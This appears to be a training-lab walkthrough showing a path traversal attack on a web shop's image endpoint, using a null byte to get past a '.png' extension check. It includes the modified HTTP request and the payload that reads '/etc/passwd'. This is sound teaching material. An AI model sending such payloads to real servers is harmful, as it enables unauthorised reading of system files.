# Lab: File Path Traversal, Validation of File Extension with Null Byte Bypass

## Objective

Exploit the path traversal vulnerability in the product image functionality to retrieve the contents of the `/etc/passwd` file.

## Vulnerability

The application validates that the supplied filename ends with the expected `.png` extension. However, this validation can be bypassed using a null byte (`%00`), which effectively terminates the filename before the appended extension.

## Steps

1. Open the lab and navigate to any product page.
2. Intercept the request for the product image using **Burp Suite**.
3. Identify the request containing the `filename` parameter.

### Original Request

```http
GET /image?filename=218.png HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
```

4. Modify the `filename` parameter to:

```text
../../../etc/passwd%00.png
```

### Modified Request

```http
GET /image?filename=../../../etc/passwd%00.png HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
```

5. Forward the request.



The server returns the contents of the `/etc/passwd` file, confirming that the application is vulnerable to Path Traversal.

Thus, the attacker is able to access the `/etc/passwd` file despite the file extension restriction.

## Payload Used

```text
../../../etc/passwd%00.png
```


## Explanation

The application checks that the supplied filename ends with the `.png` extension. The payload:

```text
../../../etc/passwd%00.png
```

passes this validation because it appears to end with `.png`.

However, `%00` represents a **null byte**, which acts as a string terminator in certain languages and APIs. As a result, the operating system interprets the path as:

```text
../../../etc/passwd
```

and ignores everything after the null byte:

```text
%00.png
```

